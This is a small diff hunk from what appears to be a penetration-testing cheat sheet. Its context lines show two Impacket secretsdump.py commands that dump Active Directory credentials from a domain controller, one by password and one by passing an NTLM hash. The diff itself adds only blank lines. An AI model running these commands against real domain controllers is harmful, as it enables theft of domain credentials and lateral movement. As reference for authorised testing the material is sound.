@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:25:54.932661+00:00'
 ./secretsdump.py -dc-ip <IP> AD\administrator@domain -use-vss -pwd-last-set -user-status 
 ./secretsdump.py -hashes <NTLM hash> -just-dc PENTESTLAB/dc\$@<IP>
 ```
+
+
